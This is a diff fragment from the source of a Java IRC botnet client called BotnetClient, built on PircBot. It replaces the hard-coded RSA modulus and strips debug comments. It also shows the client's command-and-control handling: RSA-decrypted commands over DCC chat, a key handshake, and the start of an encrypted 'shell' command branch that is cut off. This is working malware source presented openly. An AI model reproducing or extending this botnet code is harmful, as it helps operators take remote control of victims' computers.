@@ -37,7 +37,7 @@ public class BotnetClient extends PircBot {
 	
 	private MsgEncrypt m;
 	
-	private String rsaMod = "108222041463497110860036562027253803497815481093087429300526922576289985611936986257656846417328059315227295551947388936238597820965670793236463015985439165848385910941926849152966657114237523666416173178016560559992090034947593751833247705061991574017044314089114606825742634273526184011403111978366367562951";
+	private String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
 	private String rsaPublicExp = "65537";
 	
 	private boolean leased = false;
@@ -233,23 +233,12 @@ public class BotnetClient extends PircBot {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else { 
 					chat.accept();
-					//String s2 = m.decryptRSA(chat.readLine());
-					//System.out.println("c:" + s2);
-					//System.out.println("m:" + m.decryptRSA(s2));
 					String command = m.decryptRSA(chat.readLine());
 					if (command.equalsIgnoreCase("key")) {
-						//Read the key info using char.readLine(); 
 						String otherKey = m.decryptRSA(chat.readLine());
-						//s2 = chat.readLine();
-						//String otherKey = m.decryptRSA(s2);
-						//System.out.println("c:" + s2);
-						//System.out.println("m:" + m.decryptRSA(s2));
-						//System.out.println("key: " + otherKey);
 						String info = m.decryptRSA(chat.readLine());
-						//System.out.println("info: " + info);
 						m.setPubParams(info);
 						m.handShake(otherKey);
-						//chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.sendLine(m.encryptRSA(m.getStrKey()));
 						chat.close();
 					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
